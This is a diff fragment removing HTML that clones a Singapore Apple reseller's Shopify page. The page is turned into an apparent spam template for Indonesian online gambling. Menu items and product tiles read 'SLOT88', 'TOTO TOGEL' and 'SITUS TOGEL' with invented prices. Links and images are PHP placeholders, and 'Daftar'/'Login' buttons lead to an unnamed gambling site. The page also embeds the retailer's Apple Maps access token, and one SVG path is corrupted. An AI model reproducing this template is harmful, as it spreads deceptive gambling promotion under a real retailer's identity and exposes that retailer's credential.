-                    data-apple-maps-access-token="eyJraWQiOiI1SDZEQlAyR0E1IiwidHlwIjoiSldUIiwiYWxnIjoiRVMyNTYifQ.eyJpc3MiOiI0Njg5NkZRSFgyIiwiaWF0IjoxNzQ2NzYyMDY2LCJvcmlnaW4iOiJ3d3cuaXN0dWRpb3NnLmNvbSJ9.auAkvVIPCaY73yQjcammRk6DID4vJpijWzhB2kWfOzLtcEclmavkBRAn7eEViSvLKVRt45zmNjODWadyzmProg"
-                    data-distance-unit="miles"
-                    data-distance-miles-label="miles"
-                    data-distance-km-label="km"
-                    data-error-text="Error: Try again"
-                    data-select-text="Select your store"
-                    data-low-stock-html="Only {{ quantity }} left"
-                    data-unavailable-text="Unavailable"
-                    data-view-store-availability-text="View store availability"
-                    data-loading-text="Loading store"
-                    >
-                    <button
-                      class="js-my-store-locator-btn my-store-locator__btn"
-                      disabled
-                      aria-haspopup="dialog"
-                      >
-                      <div class="my-store-locator__icon">
-                          <svg aria-hidden="true" focusable="false" xmlns="http://www.w3.org/2000/svg" width="16" height="14" viewBox="0 0 16 14" fill="none">
-                            <path d="M12.7742 13.3755H3.05191C2.2285 13.3755 1.55871 12.7056 1.55871 11.8822L1.55859 5.46973H2.29228V11.8822C2.29228 12.301 2.63304 12.6417 3.0518 12.6417H12.7743C13.1931 12.6417 13.5338 12.3011 13.5338 11.8822L13.534 5.46973H14.2676V11.8822C14.2676 12.7056 13.5977 13.3755 12.7743 13.3755H12.7742Z" fill="#1D1D1F"/>
-                            <path d="M6.19597 6.04216C5.04487 6.04216 4.1084 5.10557 4.1084 3.95459H4.84209C4.84209 4.70103 5.44941 5.30836 6.19597 5.30836C6.94253 5.30836 7.54985 4.70103 7.54985 3.95459H8.28354C8.28354 5.10557 7.34707 6.04216 6.19597 6.04216Z" fill="#1D1D1F"/>
-                            <path d="M9.63738 6.04397C8.48628 6.04397 7.5498 5.10738 7.5498 3.95639V2.43213H8.28349V3.95639C8.28349 4.70284 8.89082 5.31016 9.63738 5.31016C10.3839 5.31016 10.9913 4.70284 10.9913 3.95639H11.7249C11.7249 5.10738 10.7885 6.04397 9.63738 6.04397Z" fill="#1D1D1F"/>
-                            <path d="M13.0793 6.04286C11.9282 6.04286 10.9917 5.10627 10.9917 3.95529V2.43102H11.7254V3.95529C11.7254 4.70173 12.3327 5.30906 13.0793 5.30906C13.8258 5.30906 14.4333 4.70173 14.4333 3.95529V2.54174L13.231 0.73392H2.60295L1.40068 2.54163V3.95517C1.40068 4.70162 2.00812 5.30894 2.75468 5.30894C3.50124 5.30894 4.10856 4.70162 4.10856 3.95517V2.43091H4.84225V3.95517C4.84225 5.10627 3.90578 6.04275 2.75468 6.04275C1.60347 6.04275 0.666992 5.10616 0.666992 3.95517V2.43091C0.666992 2.35862 0.688332 2.2879 0.728328 2.22768L2.10075 0.16379C2.16868 0.0614505 2.28342 0 2.40621 0H13.4275C13.5503 0 13.6651 0.0614477 13.733 0.16379L15.1057 2.22779C15.1458 2.28802 15.167 2.35874 15.167 2.43102V3.95529C15.167 5.10627 14.2305 6.04286 13.0793 6.04286H13.0793Z" fill="#1D1D1F"/>
-                            <path d="M1.0332 2.06055H14.7997V2.79435H1.0332V2.06055Z" fill="#1D1D1F"/>
-                            <rect x="5.4806" y="8.38246" width="4.63549" height="4.63549" rx="0.534864" stroke="black" stroke-width="0.713153"/>
-                          </svg>
-                      </div>
-                      <p class="js-my-store-locator-info my-store-locator__info">
-                          Loading store
-                          <i class="fa fa-spinner fa-spin"></i>
-                      </p>
-                    </button>
-                    <div
-                      class="js-my-store-locator-details my-store-locator__details"
-                      tabindex="-1"
-                      role="dialog"
-                      aria-modal="true"
-                      aria-labelledby="MyStoreDetailsHeading"
-                      >
-                      <button
-                          class="js-my-store-locator-close my-store-locator__close"
-                          type="button"
-                          aria-label="Close"
-                          >
-                          <svg
-                            xmlns="http://www.w3.org/2000/svg"
-                            aria-hidden="true"
-                            focusable="false"
-                            class="icon icon-close"
-                            fill="none"
-                            viewBox="0 0 18 17"
-                            width="18"
-                            height="17"
-                            >
-                            <path
-                                d="M.865 15.978a.5.5 0 00.707.707l7.433-7.431 7.579 7.282a.501.501 0 00.846-.37.5.5 0 00-.153-.351L9.712 8.546l7.417-7.416a.5.5 0 10-.707-.708L8.991 7.853 1.413.573a.5.5 0 10-.693.72l7.563 7.268-7.418 7.417z"
-                                fill="currentColor"
-                                >
-                          </svg>
-                      </button>
-                      <div class="my-store-locator__details-header">
-                          <h2 class="my-store-locator__details-title" id="MyStoreDetailsHeading"></h2>
-                          <span class="js-my-store-locator-distance my-store-locator__details-distance hidden">
-                          <i class="fa fa-spinner fa-spin"></i>
-                          </span>
-                      </div>
-                      <div class="js-my-store-locator-location my-store-locator__details-location"></div>
-                      <div class="my-store-locator-content">
-                          <div class="js-my-store-locator-address my-store-locator__details-info hidden">
-                            Address: <a href="#" target="_blank"></a>
-                          </div>
-                          <div class="js-my-store-locator-telephone my-store-locator__details-info hidden">
-                            Telephone: <a href="#"></a>
-                          </div>
-                          <div class="js-my-store-locator-email my-store-locator__details-info hidden">
-                            Email: <a href="#" target="_blank"></a>
-                          </div>
-                          <div class="js-my-store-locator-hours my-store-locator__details-info hidden">
-                            Hours: <span></span>
-                          </div>
-                          <div class="js-my-store-locator-services hidden"></div>
-                      </div>
-                      <div class="my-store-locator__details-footer"><a
-                          class="my-store-locator__details-btn--secondary button button--secondary button--full-width"
-                          href="/pages/store-locator"
-                          >
-                          View store map
-                          </a><button
-                            class="js-my-store-locator-drawer-btn my-store-locator__details-btn button button--full-width"
-                            aria-haspopup="dialog"
-                            >
-                          Select another store
-                          </button>
-                      </div>
-                    </div>
-                </my-store-locator>
-                <script src="https://www.istudiosg.com/cdn/shop/t/14/assets/my-store-locator.js?v=14296370560110765121259103666" defer="defer"></script>
-                <script>
-                    SDG.Data.mapsToken = "eyJraWQiOiI1SDZEQlAyR0E1IiwidHlwIjoiSldUIiwiYWxnIjoiRVMyNTYifQ.eyJpc3MiOiI0Njg5NkZRSFgyIiwiaWF0IjoxNzQ2NzYyMDY2LCJvcmlnaW4iOiJ3d3cuaXN0dWRpb3NnLmNvbSJ9.auAkvVIPCaY73yQjcammRk6DID4vJpijWzhB2kWfOzLtcEclmavkBRAn7eEViSvLKVRt45zmNjODWadyzmProg";
-                    SDG.Data.googleMapsToken = "";
-                    SDG.Data.mapProvider = "apple_maps";
-                    
-                      SDG.Data.mapPage = false;
-                    
-                    SDG.Data.storeServiceTrigger = 'View store services';
-                    SDG.Data.storeHours =  'Hours';
-                    SDG.Data.storeAddress = 'Address';
-                    SDG.Data.storeEmail = 'Email';
-                    SDG.Data.storePhone = 'Telephone';
-                    SDG.Data.myStore = 'My store';
-                    SDG.Data.makeThisMyStore = 'Make this my store';
-                    SDG.Data.shopCountry = 'Singapore';
-                </script>
-                <script src="https://www.istudiosg.com/cdn/shop/t/14/assets/mapkit.js?v=2554415917941391361742784889" defer></script><script async>
-                    document?.addEventListener('DOMContentLoaded', function() {
-                      if (window?.mapkit) {
-                      mapkit.init({
-                        authorizationCallback: function (done) {
-                          done("eyJraWQiOiI1SDZEQlAyR0E1IiwidHlwIjoiSldUIiwiYWxnIjoiRVMyNTYifQ.eyJpc3MiOiI0Njg5NkZRSFgyIiwiaWF0IjoxNzQ2NzYyMDY2LCJvcmlnaW4iOiJ3d3cuaXN0dWRpb3NnLmNvbSJ9.auAkvVIPCaY73yQjcammRk6DID4vJpijWzhB2kWfOzLtcEclmavkBRAn7eEViSvLKVRt45zmNjODWadyzmProg");
-                        },
-                        language: 'en',
-                      });
-                      }
-                    
-                      if (window?.google) {
-                        google.maps.importLibrary('geocoding');
-                        google.maps.importLibrary('places');
-                      }
-                    });
-                </script>
-                <div class="header__icons">
-                    <div class="desktop-localization-wrapper">
-                    </div>
-                    <a href="/account/login" class="header__icon header__icon--account link focus-inset small-hide">
-                      <svg
-                          xmlns="http://www.w3.org/2000/svg"
-                          aria-hidden="true"
-                          focusable="false"
-                          class="icon icon-account"
-                          fill="none"
-                          viewBox="0 0 18 19"
-                          width="18"
-                          height="19"
-                          >
-                          <path fill-rule="evenodd" clip-rule="evenodd" d="M6 4.5a3 3 0 116 0 3 3 0 01-6 0zm3-4a4 4 0 100 8 4 4 0 000-8zm5.58 12.15c1.12.82 1.83 2.24 1.91 4.85H1.51c.08-2.6.79-4.03 1.9-4.85C4.66 11.75 6.5 11.5 9 11.5s4.35.26 5.58 1.15zM9 10.5c-2.5 0-4.65.24-6.17 1.35C1.27 12.98.5 14.93.5 18v.5h17V18c0-3.07-.77-5.02-2.33-6.15-1.52-1.1-3.67-1.35-6.17-1.35z" fill="currentColor">
-                      </svg>
-                      <span class="visually-hidden">Log in</span>
-                    </a>
-                    <a href="javascript: void(0)" class="header__icon header__icon--cart link focus-inset" id="cart-icon-bubble">
-                      <svg width="19" height="22" viewBox="0 0 19 22" fill="none" xmlns="http://www.w3.org/2000/svg">
-                          <path fill-rule="evenodd" clip-rule="evenodd" d="M6.5 4.25C6.5 2.93882 7.76806 1.75 9.5 1.75C11.2319 1.75 12.5 2.93882 12.5 4.25H6.5ZM5.5 4.25C5.5 2.24747 7.36595 0.75 9.5 0.75C11.6341 0.75 13.5 2.24747 13.5 4.25H17C18.1046 4.25 19 5.14543 19 6.25V19.25C19 20.3546 18.1046 21.25 17 21.25H2C0.895431 21.25 0 20.3546 0 19.25V6.25C0 5.14543 0.895431 4.25 2 4.25H5.5ZM1 6.25C1 5.69772 1.44772 5.25 2 5.25H17C17.5523 5.25 18 5.69772 18 6.25V19.25C18 19.8023 17.5523 20.25 17 20.25H2C1.44772 20.25 1 19.8023 1 19.25V6.25Z" fill="currentColor"/>
-                      </svg>
-                      <span class="visually-hidden">Cart</span>
-                    </a>
-                </div>
-              </header>
-              <div class="header_nav">
-                <lazyload-section data-selectors='[".js-header-dropdown-menu-list"]'>
-                    <nav class="header__inline-menu">
-                      <ul class="list-menu list-menu--inline">
-                          <li>
-                            <header-menu>
-                                <details
-                                  id="Details-HeaderMenu-1"
-                                  class="mainMenuUpdate2"
-                                  >
-                                  <summary
-                                      id="headerCss HeaderMenu-mac"
-                                      class="header__menu-item list-menu__item link focus-inset"
-                                      >
-                                      <p><a href="<?= $canonical; ?>"><?= $BRAND; ?></a></p>
-                                      <svg aria-hidden="true" focusable="false" class="icon icon-caret" viewBox="0 0 10 6">
-                                        <path fill-rule="evenodd" clip-rule="evenodd" d="M9.354.646a.5.5 0 00-.708 0L5 4.293 1.354.646a.5.5 0 00-.708.708l4 4a.5.5 0 00.708 0l4-4a.5.5 0 000-.708z" fill="currentColor">
-                                      </svg>
-                                  </summary>
-                                  <ul
-                                      id="HeaderMenu-MenuList-1"
-                                      class="js-header-dropdown-menu-list header__submenu list-menu list-menu--disclosure color-background-1 gradient caption-large motion-reduce global-settings-popup"
-                                      tabindex="-1"
-                                      ></ul>
-                                </details>
-                            </header-menu>
-                          </li>
-                          <li>
-                            <header-menu>
-                                <details
-                                  id="Details-HeaderMenu-2"
-                                  class="mainMenuUpdate2"
-                                  >
-                                  <summary
-                                      id="headerCss HeaderMenu-ipad"
-                                      class="header__menu-item list-menu__item link focus-inset"
-                                      >
-                                    <p><a href="<?= $canonical; ?>">SLOT88</a></p>
-                                      <svg aria-hidden="true" focusable="false" class="icon icon-caret" viewBox="0 0 10 6">
-                                        <path fill-rule="evenodd" clip-rule="evenodd" d="M9.354.646a.5.5 0 00-.708 0L5 4.293 1.354.646a.5.5 0 00-.708.708l4 4a.5.5 0 00.708 0l4-4a.5.5 0 000-.708z" fill="currentColor">
-                                      </svg>
-                                  </summary>
-                                  <ul
-                                      id="HeaderMenu-MenuList-2"
-                                      class="js-header-dropdown-menu-list header__submenu list-menu list-menu--disclosure color-background-1 gradient caption-large motion-reduce global-settings-popup"
-                                      tabindex="-1"
-                                      ></ul>
-                                </details>
-                            </header-menu>
-                          </li>
-                          <li>
-                            <header-menu>
-                                <details
-                                  id="Details-HeaderMenu-3"
-                                  class="mainMenuUpdate2"
-                                  >
-                                  <summary
-                                      id="headerCss HeaderMenu-iphone"
-                                      class="header__menu-item list-menu__item link focus-inset"
-                                      >
-                                      <p><a href="<?= $canonical; ?>">TOTO TOGEL</a></p>
-                                      <svg aria-hidden="true" focusable="false" class="icon icon-caret" viewBox="0 0 10 6">
-                                        <path fill-rule="evenodd" clip-rule="evenodd" d="M9.354.646a.5.5 0 00-.708 0L5 4.293 1.354.646a.5.5 0 00-.708.708l4 4a.5.5 0 00.708 0l4-4a.5.5 0 000-.708z" fill="currentColor">
-                                      </svg>
-                                  </summary>
-                                  <ul
-                                      id="HeaderMenu-MenuList-3"
-                                      class="js-header-dropdown-menu-list header__submenu list-menu list-menu--disclosure color-background-1 gradient caption-large motion-reduce global-settings-popup"
-                                      tabindex="-1"
-                                      ></ul>
-                                </details>
-                            </header-menu>
-                          </li>
-                          <li>
-                            <header-menu>
-                                <details
-                                  id="Details-HeaderMenu-4"
-                                  class="mainMenuUpdate2"
-                                  >
-                                  <summary
-                                      id="headerCss HeaderMenu-watch"
-                                      class="header__menu-item list-menu__item link focus-inset"
-                                      >
-                                      <p><a href="<?= $canonical; ?>">TOGEL ONLINE</a></p>
-                                      <svg aria-hidden="true" focusable="false" class="icon icon-caret" viewBox="0 0 10 6">
-                                        <path fill-rule="evenodd" clip-rule="evenodd" d="M9.354.646a.5.5 0 00-.708 0L5 4.293 1.354.646a.5.5 0 00-.708.708l4 4a.5.5 0 00.708 0l4-4a.5.5 0 000-.708z" fill="currentColor">
-                                      </svg>
-                                  </summary>
-                                  <ul
-                                      id="HeaderMenu-MenuList-4"
-                                      class="js-header-dropdown-menu-list header__submenu list-menu list-menu--disclosure color-background-1 gradient caption-large motion-reduce global-settings-popup"
-                                      tabindex="-1"
-                                      ></ul>
-                                </details>
-                            </header-menu>
-                          </li>
-                          <li>
-                            <header-menu>
-                                <details
-                                  id="Details-HeaderMenu-5"
-                                  class="mainMenuUpdate2"
-                                  >
-                                  <summary
-                                      id="headerCss HeaderMenu-music"
-                                      class="header__menu-item list-menu__item link focus-inset"
-                                      >
-                                      <p><a href="<?= $canonical; ?>">SLOT</a></p>
-                                      <svg aria-hidden="true" focusable="false" class="icon icon-caret" viewBox="0 0 10 6">
-                                        <path fill-rule="evenodd" clip-rule="evenodd" d="M9.354.646a.5.5 0 00-.708 0L5 4.293 1.354.646a.5.5 0 00-.708.708l4 4a.5.5 0 00.708 0l4-4a.5.5 0 000-.708z" fill="currentColor">
-                                      </svg>
-                                  </summary>
-                                  <ul
-                                      id="HeaderMenu-MenuList-5"
-                                      class="js-header-dropdown-menu-list header__submenu list-menu list-menu--disclosure color-background-1 gradient caption-large motion-reduce global-settings-popup"
-                                      tabindex="-1"
-                                      ></ul>
-                                </details>
-                            </header-menu>
-                          </li>
-                          <li>
-                            <header-menu>
-                                <details
-                                  id="Details-HeaderMenu-6"
-                                  class="mainMenuUpdate2"
-                                  >
-                                  <summary
-                                      id="headerCss HeaderMenu-tv-home"
-                                      class="header__menu-item list-menu__item link focus-inset"
-                                      >
-                                    <p><a href="<?= $canonical; ?>">SITUS TOGEL</a></p>
-                                      <svg aria-hidden="true" focusable="false" class="icon icon-caret" viewBox="0 0 10 6">
-                                        <path fill-rule="evenodd" clip-rule="evenodd" d="M9.V354.646a.5.5 0 00-.708 0L5 4.293 1.354.646a.5.5 0 00-.708.708l4 4a.5.5 0 00.708 0l4-4a.5.5 0 000-.708z" fill="currentColor">
-                                      </svg>
-                                  </summary>
-                                  <ul
-                                      id="HeaderMenu-MenuList-6"
-                                      class="js-header-dropdown-menu-list header__submenu list-menu list-menu--disclosure color-background-1 gradient caption-large motion-reduce global-settings-popup"
-                                      tabindex="-1"
-                                      ></ul>
-                                </details>
-                            </header-menu>
-                          </li>
-                          <li>
-                            <header-menu>
-                                <details
-                                  id="Details-HeaderMenu-7"
-                                  class="mainMenuUpdate2"
-                                  >
-                                  <summary
-                                      id="headerCss HeaderMenu-accessories"
-                                      class="header__menu-item list-menu__item link focus-inset"
-                                      >
-                                      <p><a href="<?= $canonical; ?>">TOGEL 4D</a></p>
-                                      <svg aria-hidden="true" focusable="false" class="icon icon-caret" viewBox="0 0 10 6">
-                                        <path fill-rule="evenodd" clip-rule="evenodd" d="M9.354.646a.5.5 0 00-.708 0L5 4.293 1.354.646a.5.5 0 00-.708.708l4 4a.5.5 0 00.708 0l4-4a.5.5 0 000-.708z" fill="currentColor">
-                                      </svg>
-                                  </summary>
-                                  <ul
-                                      id="HeaderMenu-MenuList-7"
-                                      class="js-header-dropdown-menu-list header__submenu list-menu list-menu--disclosure color-background-1 gradient caption-large motion-reduce global-settings-popup"
-                                      tabindex="-1"
-                                      ></ul>
-                                </details>
-                            </header-menu>
-                          </li>
-                          <li>
-                            <header-menu>
-                                <details
-                                  id="Details-HeaderMenu-8"
-                                  class="mainMenuUpdate2"
-                                  >
-                                  <summary
-                                      id="headerCss HeaderMenu-services"
-                                      class="header__menu-item list-menu__item link focus-inset"
-                                      >
-                                      <p><a href="<?= $canonical; ?>">SITUS RESMI</a></p>
-                                      <svg aria-hidden="true" focusable="false" class="icon icon-caret" viewBox="0 0 10 6">
-                                        <path fill-rule="evenodd" clip-rule="evenodd" d="M9.354.646a.5.5 0 00-.708 0L5 4.293 1.354.646a.5.5 0 00-.708.708l4 4a.5.5 0 00.708 0l4-4a.5.5 0 000-.708z" fill="currentColor">
-                                      </svg>
-                                  </summary>
-                                  <ul
-                                      id="HeaderMenu-MenuList-8"
-                                      class="js-header-dropdown-menu-list header__submenu list-menu list-menu--disclosure color-background-1 gradient caption-large motion-reduce global-settings-popup"
-                                      tabindex="-1"
-                                      ></ul>
-                                </details>
-                            </header-menu>
-                          </li>
-                          <li>
-                            <header-menu>
-                                <details
-                                  id="Details-HeaderMenu-9"
-                                  class="mainMenuUpdate2"
-                                  >
-                                  <summary
-                                      id="headerCss HeaderMenu-offers"
-                                      class="header__menu-item list-menu__item link focus-inset"
-                                      >
-                                      <p><a href="<?= $canonical; ?>">TOGEL RESMI</a></p>
-                                      <svg aria-hidden="true" focusable="false" class="icon icon-caret" viewBox="0 0 10 6">
-                                        <path fill-rule="evenodd" clip-rule="evenodd" d="M9.354.646a.5.5 0 00-.708 0L5 4.293 1.354.646a.5.5 0 00-.708.708l4 4a.5.5 0 00.708 0l4-4a.5.5 0 000-.708z" fill="currentColor">
-                                      </svg>
-                                  </summary>
-                                  <ul
-                                      id="HeaderMenu-MenuList-9"
-                                      class="js-header-dropdown-menu-list header__submenu list-menu list-menu--disclosure color-background-1 gradient caption-large motion-reduce global-settings-popup"
-                                      tabindex="-1"
-                                      ></ul>
-                                </details>
-                            </header-menu>
-                          </li>
-                          <li class="right_header_division right_menu_divider"></li>
-                          <li><a
-                            href="<?= $ampmek; ?>" target="_blank" rel="nofollow noopener noreferrer"
-                            class="rightMenuUpdate headerCss header__menu-item header__menu-item list-menu__item link link--text focus-inset"
-                            >
-                            <span
-                                >Daftar</span>
-                            </a>
-                          </li>
-                          <li><a
-                            href="<?= $ampmek; ?>" target="_blank" rel="nofollow noopener noreferrer"
-                            class="rightMenuUpdate headerCss header__menu-item header__menu-item list-menu__item link link--text focus-inset"
-                            >
-                            <span
-                                >Login</span>
-                            </a>
-                          </li>
-                      </ul>
-                    </nav>
-                </lazyload-section>
-              </div>
-          </sticky-header>
-          <link href="https://www.istudiosg.com/cdn/shop/t/14/assets/custom-style.css?v=128650136086380557481742784888" rel="stylesheet" type="text/css" media="all" />
-          <lazyload-section data-render-on-load="true" data-selector="cart-notification"></lazyload-section>
-          <style>
-              .cart-notification {
-              display: none;
-              }
-          </style>
-  <script type="application/ld+json">
-  {
-    "@context": "https://schema.org",
-    "@type": "Organization",
-    "name": "<?= $BRAND; ?>",
-    "url": "<?= $canonical; ?>",
-    "sameAs": [
-      "https://www.facebook.com/<?= $BRAND; ?>",
-      "https://www.instagram.com/<?= $BRAND; ?>/",
-      "https://www.youtube.com/channel/<?= $BRAND; ?>/"
-    ]
-  }
-  </script>
-          <script>
-              $("input").focus(function() {
-                $(".btn_close").css("visibility", "visible");
-              });
-              $(".btn_close").on("mousedown ", function() {
-                $(".nosubmit").val("");
-              });
-              $("input").focusout(function() {
-                $(".btn_close").css("visibility", "hidden");
-              });
-              $("input").focus(function() {
-                if (document.querySelector('.gl-fullscreen-header') !== null) {
-                $(".btn_close").css("visibility", "hidden");
-              }
-              });
-              $("#Details-menu-drawer-container").on("click", function() {
-                if($("#cart-notification").hasClass("minicart-active")) {
-                  $("#cart-notification").hide();
-                  $('#cart-notification').removeClass('minicart-active');
-                }
-              });
-              $('body,html').click(function(e){
-                if($("#cart-notification").hasClass("minicart-active")) {
-                  $("#cart-notification").hide();
-                  $('#cart-notification').removeClass('minicart-active');
-                }
-              });
-          </script>
-        </div>
-        <!-- END sections: header-group -->
-        <div class="hidden">
-          <div id="shopify-section-predictive-search" class="shopify-section">
-          </div>
-        </div>
-        <div id="shopify-section-navigation_stripe" class="shopify-section slider-container">
-          <style>
-              div#shopify-section-navigation_stripe {
-              display: flex;
-              width: 100%;
-              background: #fff;
-              padding: 12px 0;
-              box-shadow: inset 0px -0.5px 0px #d2d2d2;
-              height: 108px;
-              max-height: 108px;
-              overflow: hidden;
-              }
-          </style>
-          <div class="nav-left-arrow"></div>
-          <div class="apl_lob_slider without_main_title apl_lob_slider-ipad">
-              <div class="apl_lob_list_item">
-                <a href="<?= $canonical; ?>" target="_blank" rel="nofollow noopener noreferrer">
-                    <div class="list-lob">
-                      <div
-                          class="imagecontainer ratio"
-                          style="--ratio-percent: 100%;"
-                          >
-                          <img
-                            src="<?= $image; ?>?v=1757657996&width=100"
-                            srcset="<?= $image; ?> 240w"
-                            sizes="(max-width): 90px,(max-width): 180px,100vw"
-                            height="84"
-                            width="84"
-                            loading="lazy"
-                            alt="<?= $BRAND; ?>"
-                            >
-                      </div>
-                      <div class="apl_lob_content">
-                          <div class="tagcontainer">
-                            <div class="apl_label_attr" style="color: #168edf">
-                                NEW
-                            </div>
-                          </div>
-                          <p class="apl_lob_title"><?= $BRAND; ?></p>
-                          <p class="prod apl_lob_price">
-                            From
-                            $8.008 SGD
-                          </p>
-                      </div>
-                    </div>
-                </a>
-              </div>
-              <div class="apl_lob_list_item">
-                <a href="<?= $canonical; ?>" target="_blank" rel="nofollow noopener noreferrer">
-                    <div class="list-lob">
-                      <div
-                          class="imagecontainer ratio"
-                          style="--ratio-percent: 100%;"
-                          >
-                          <img
-                            src="<?= $image; ?>?v=1757657995&width=100"
-                            srcset="<?= $image; ?>?v=1757657995&width=90<?= $image; ?>?v=1757657995&width=180<?= $image; ?>?v=1757657995&width=240 240w"
-                            sizes="(max-width): 90px,(max-width): 180px,100vw"
-                            height="84"
-                            width="84"
-                            loading="lazy"
-                            alt="SLOT88"
-                            >
-                      </div>
-                      <div class="apl_lob_content">
-                          <div class="tagcontainer">
-                            <div class="apl_label_attr" style="color: #168edf">
-                                NEW
-                            </div>
-                          </div>
-                          <p class="apl_lob_title">SLOT88</p>
-                          <p class="prod apl_lob_price">
-                            From
-                            $889.99 SGD
-                          </p>
-                      </div>
-                    </div>
-                </a>
-              </div>
-              <div class="apl_lob_list_item">
-                <a href="<?= $canonical; ?>" target="_blank" rel="nofollow noopener noreferrer">
-                    <div class="list-lob">
-                      <div
-                          class="imagecontainer ratio"
-                          style="--ratio-percent: 100%;"
-                          >
-                          <img
-                            src="<?= $image; ?>?v=1757657995&width=100"
-                            srcset="<?= $image; ?>?v=1757657995&width=90<?= $image; ?>?v=1757657995&width=180<?= $image; ?>?v=1757657995&width=240 240w"
-                            sizes="(max-width): 90px,(max-width): 180px,100vw"
-                            height="84"
-                            width="84"
-                            loading="lazy"
-                            alt="TOTO TOGEL"
-                            >
-                      </div>
-                      <div class="apl_lob_content">
-                          <div class="tagcontainer">
-                            <div class="apl_label_attr" style="color: #168edf">
-                                NEW
-                            </div>
-                          </div>
-                          <p class="apl_lob_title">TOTO TOGEL</p>
-                          <p class="prod apl_lob_price">
-                            From
-                            $752.00 SGD
-                          </p>
-                      </div>
-                    </div>
-                </a>
-              </div>
-              <div class="apl_lob_list_item">
-                <a href="<?= $canonical; ?>" target="_blank" rel="nofollow noopener noreferrer">
-                    <div class="list-lob">
-                      <div
-                          class="imagecontainer ratio"
-                          style="--ratio-percent: 100%;"
-                          >
-                          <img
-                            src="<?= $image; ?>?v=1740017919&width=100"
-                            srcset="<?= $image; ?>?v=1740017919&width=90<?= $image; ?>?v=1740017919&width=180<?= $image; ?>?v=1740017919&width=240 240w"
-                            sizes="(max-width): 90px,(max-width): 180px,100vw"
-                            height="84"
-                            width="84"
-                            loading="lazy"
-                            alt="SLOT"
-                            >
-                      </div>
-                      <div class="apl_lob_content">
-                          <div class="tagcontainer">
-                            <div class="apl_label_attr" style="color: #168edf">
-                                NEW
-                            </div>
-                          </div>
-                          <p class="apl_lob_title">SLOT</p>
-                          <p class="prod apl_lob_price">
-                            From
-                            $999.00 SGD
-                          </p>
-                      </div>
-                    </div>
-                </a>
-              </div>
-              <div class="apl_lob_list_item">
-                <a href="<?= $canonical; ?>" target="_blank" rel="nofollow noopener noreferrer">
-                    <div class="list-lob">
-                      <div
-                          class="imagecontainer ratio"
-                          style="--ratio-percent: 100%;"
-                          >
-                          <img
-                            src="<?= $image; ?>?v=1731047537&width=100"
-                            srcset="<?= $image; ?>?v=1731047537&width=90<?= $image; ?>?v=1731047537&width=180<?= $image; ?>?v=1731047537&width=240 240w"
-                            sizes="(max-width): 90px,(max-width): 180px,100vw"
-                            height="84"
-                            width="84"
-                            loading="lazy"
-                            alt="TOGEL ONLINE"
-                            >
-                      </div>
-                      <div class="apl_lob_content">
-                          <div class="tagcontainer">
-                          </div>
-                          <p class="apl_lob_title">TOGEL ONLINE</p>
-                          <p class="prod apl_lob_price">
-                            From
-                            $1888.00 SGD
-                          </p>
-                      </div>
-                    </div>
-                </a>
-              </div>
-              <div class="apl_lob_list_item">
-                <a href="<?= $canonical; ?>" target="_blank" rel="nofollow noopener noreferrer">
-                    <div class="list-lob">
-                      <div
-                          class="imagecontainer ratio"
-                          style="--ratio-percent: 100%;"
-                          >
-                          <img
-                            src="<?= $image; ?>?v=1731636011&width=100"
-                            srcset="<?= $image; ?>?v=1731636011&width=90<?= $image; ?>?v=1731636011&width=180<?= $image; ?>?v=1731636011&width=240 240w"
-                            sizes="(max-width): 90px,(max-width): 180px,100vw"
-                            height="84"
-                            width="84"
-                            loading="lazy"
-                            alt="SITUS TOGEL"
-                            >
-                      </div>
-                      <div class="apl_lob_content">
-                          <div class="tagcontainer">
-                            <div class="apl_label_attr" style="color: #168edf">
-                                NEW
-                            </div>
-                          </div>
-                          <p class="apl_lob_title">SITUS TOGEL</p>
-                          <p class="collection apl_lob_price">
-                            From
-                            $99.00 SGD
-                          </p>
-                      </div>
-                    </div>
-                </a>
-              </div>
-        <div class="apl_lob_list_item">
-                <a href="<?= $canonical; ?>" target="_blank" rel="nofollow noopener noreferrer">
-                    <div class="list-lob">
-                      <div
-                          class="imagecontainer ratio"
-                          style="--ratio-percent: 100%;"
-                          >
-                          <img
-                            src="<?= $image; ?>?v=1731636011&width=100"
-                            srcset="<?= $image; ?>?v=1731636011&width=90<?= $image; ?>?v=1731636011&width=180<?= $image; ?>?v=1731636011&width=240 240w"
-                            sizes="(max-width): 90px,(max-width): 180px,100vw"
-                            height="84"
-                            width="84"
-                            loading="lazy"
-                            alt="TOGEL 4D"
-                            >
-                      </div>
-                      <div class="apl_lob_content">
-                          <div class="tagcontainer">
-                            <div class="apl_label_attr" style="color: #168edf">
-                                NEW
-                            </div>
-                          </div>
-                          <p class="apl_lob_title">TOGEL 4D</p>
-                          <p class="collection apl_lob_price">
-                            From
-                            $99.00 SGD
-                          </p>
-                      </div>
-                    </div>
-                </a>
-              </div>
-        <div class="apl_lob_list_item">
-                <a href="<?= $canonical; ?>" target="_blank" rel="nofollow noopener noreferrer">
-                    <div class="list-lob">
-                      <div
-                          class="imagecontainer ratio"
-                          style="--ratio-percent: 100%;"
-                          >
-                          <img
-                            src="<?= $image; ?>?v=1731636011&width=100"
-                            srcset="<?= $image; ?>?v=1731636011&width=90<?= $image; ?>?v=1731636011&width=180<?= $image; ?>?v=1731636011&width=240 240w"
-                            sizes="(max-width): 90px,(max-width): 180px,100vw"
-                            height="84"
-                            width="84"
-                            loading="lazy"
-                            alt="SITUS RESMI"
-                            >
-                      </div>
-                      <div class="apl_lob_content">
-                          <div class="tagcontainer">
-                            <div class="apl_label_attr" style="color: #168edf">
-                                NEW
-                            </div>
-                          </div>
-                          <p class="apl_lob_title">SITUS RESMI</p>
-                          <p class="collection apl_lob_price">
-                            From
-                            $88.99 SGD
-                          </p>
-                      </div>
-                    </div>
-                </a>
-              </div>
-              <div class="apl_lob_list_item end_lob_text">
-                <a href="<?= $canonical; ?>" target="_blank" rel="nofollow noopener noreferrer" class="end_lob_title">
-                    <span class="end_title_anchor">
-                      View All iPhone
-                      <svg width="5" height="9" viewBox="0 0 5 9" fill="none" xmlns="http://www.w3.org/2000/svg">
-                          <path fill-rule="evenodd" clip-rule="evenodd" d="M0.649682 8.5L0 7.85032L3.35032 4.5L0 1.14968L0.649682 0.5L4.64968 4.5L0.649682 8.5Z" fill="#0071E3"/>
-                      </svg>
-                    </span>
-                </a>
-              </div>
-          </div>
-          <div class="nav-right-arrow"></div>
-          
-        </div>
-        <main id="MainContent" class="content-for-layout focus-none" role="main" tabindex="-1">
-          <section id="shopify-section-template--17605519376564__main" class="shopify-section section">
-              <section
-                id="MainProduct-template--17605519376564__main"
-                class="product-page-width page-width section-template--17605519376564__main-padding"
